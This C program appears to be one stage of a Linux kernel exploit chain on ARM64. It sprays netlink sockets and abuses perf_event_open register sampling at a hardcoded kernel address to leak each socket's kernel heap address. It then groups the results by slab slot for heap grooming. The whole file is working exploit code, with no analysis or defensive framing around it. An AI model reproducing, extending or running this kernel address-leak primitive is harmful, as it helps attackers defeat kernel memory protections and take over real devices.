/*
 * 6931 data-chain geometry step (no OOB, no kernel writes).
 * Spray netlink sockets, leak each sock address with the PMU x19 sampler,
 * group by 32 KiB slab and report slabs that have live slots 0/1/2.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#ifndef __NR_perf_event_open
#define __NR_perf_event_open 241
#endif
#define PERF_TYPE_HARDWARE 0
#define PERF_COUNT_HW_CPU_CYCLES 0
#define PERF_SAMPLE_IP 1ULL
#define PERF_SAMPLE_REGS_INTR (1ULL << 18)
#define PERF_RECORD_SAMPLE 9
#define SLAB_SIZE 0x8000UL
#define SLOT 0x800UL

struct attr_min {
    uint32_t type, size;
    uint64_t config, sample_period, sample_type, read_format, flags;
    uint32_t wakeup_events, bp_type;
    uint64_t bp_addr, bp_len;
    uint64_t branch_sample_type, sample_regs_user;
    uint32_t sample_stack_user;
    int32_t clockid;
    uint64_t sample_regs_intr;
    uint32_t aux_watermark;
    uint16_t sample_max_stack, reserved2;
    uint32_t aux_sample_size, reserved3;
};

static int perf_open(long period) {
    struct attr_min a;
    memset(&a, 0, sizeof(a));
    a.type = PERF_TYPE_HARDWARE;
    a.size = 112;
    a.config = PERF_COUNT_HW_CPU_CYCLES;
    a.sample_period = (uint64_t)period;
    a.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
    a.flags = 1ULL << 4;
    a.sample_regs_intr = 1ULL << 19;
    return (int)syscall(__NR_perf_event_open, &a, 0, -1, -1, 0);
}

static uint64_t leak_one(int fd, uint64_t target, long period, int ms,
                         size_t pg, uint64_t mask) {
    int pfd = perf_open(period);
    if (pfd < 0)
        return 0;
    size_t pages = 128, ring_len = pg * (pages + 1);
    void *ring = mmap(NULL, ring_len, PROT_READ | PROT_WRITE, MAP_SHARED, pfd, 0);
    if (ring == MAP_FAILED) {
        close(pfd);
        return 0;
    }
    volatile uint64_t *meta = (volatile uint64_t *)ring;
    unsigned char *data = (unsigned char *)ring + pg;
    uint64_t tail = 0, addr = 0;
    char buf[64];
    struct iovec iov = {.iov_base = buf, .iov_len = sizeof(buf)};
    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    struct timespec t0, t1;
    clock_gettime(CLOCK_MONOTONIC, &t0);
    int got = 0;
    while (!got) {
        for (int k = 0; k < 200; k++)
            syscall(SYS_recvmsg, fd, &msg, 0x40);
        uint64_t head = meta[1];
        while (tail < head) {
            unsigned char *rec = data + (tail & mask);
            uint32_t type;
            uint16_t size;
            memcpy(&type, rec, 4);
            memcpy(&size, rec + 6, 2);
            if (!size)
                break;
            if (type == PERF_RECORD_SAMPLE) {
                uint64_t ip, x19;
                memcpy(&ip, rec + 8, 8);
                memcpy(&x19, rec + 24, 8);
                if (ip >= target && ip <= target + 0x80) {
                    addr = x19;
                    got = 1;
                }
            }
            tail += size;
        }
        meta[0] = tail;
        clock_gettime(CLOCK_MONOTONIC, &t1);
        if ((t1.tv_sec - t0.tv_sec) * 1000 + (t1.tv_nsec - t0.tv_nsec) / 1000000 > ms)
            break;
    }
    munmap(ring, ring_len);
    close(pfd);
    return addr;
}

int main(int argc, char **argv) {
    int n = argc > 1 ? atoi(argv[1]) : 32;
    uint64_t target = argc > 2 ? strtoull(argv[2], 0, 0) : 0xffffffe575ddeca4ULL;
    long period = argc > 3 ? atol(argv[3]) : 50000;
    int ms = argc > 4 ? atoi(argv[4]) : 800;

    int *fds = calloc(n, sizeof(int));
    uint64_t *addr = calloc(n, sizeof(uint64_t));
    for (int i = 0; i < n; i++) {
        fds[i] = socket(16, 3, 0);
        if (fds[i] < 0) {
            printf("socket %d: %s\n", i, strerror(errno));
            return 1;
        }
    }
    for (int i = 0; i < n; i++) {
        addr[i] = leak_one(fds[i], target, period, ms, 4096, 4096 * 128 - 1);
        printf("sock[%2d] fd=%d addr=%#llx%s\n", i, fds[i],
               (unsigned long long)addr[i], addr[i] ? "" : " (no hit)");
        fflush(stdout);
    }
    printf("---- slab groups ----\n");
    for (int i = 0; i < n; i++) {
        if (!addr[i])
            continue;
        uint64_t base = addr[i] & ~(SLAB_SIZE - 1);
        int seen = 0;
        for (int j = 0; j < i; j++)
            if (addr[j] && (addr[j] & ~(SLAB_SIZE - 1)) == base)
                seen = 1;
        if (seen)
            continue;
        printf("slab base=%#llx align64k=%d\n", (unsigned long long)base,
               (base & 0xffff) == 0);
        for (int j = 0; j < n; j++) {
            if (addr[j] && (addr[j] & ~(SLAB_SIZE - 1)) == base)
                printf("   slot %2llu fd=%d addr=%#llx\n",
                       (unsigned long long)((addr[j] - base) / SLOT), fds[j],
                       (unsigned long long)addr[j]);
        }
    }
    return 0;
}
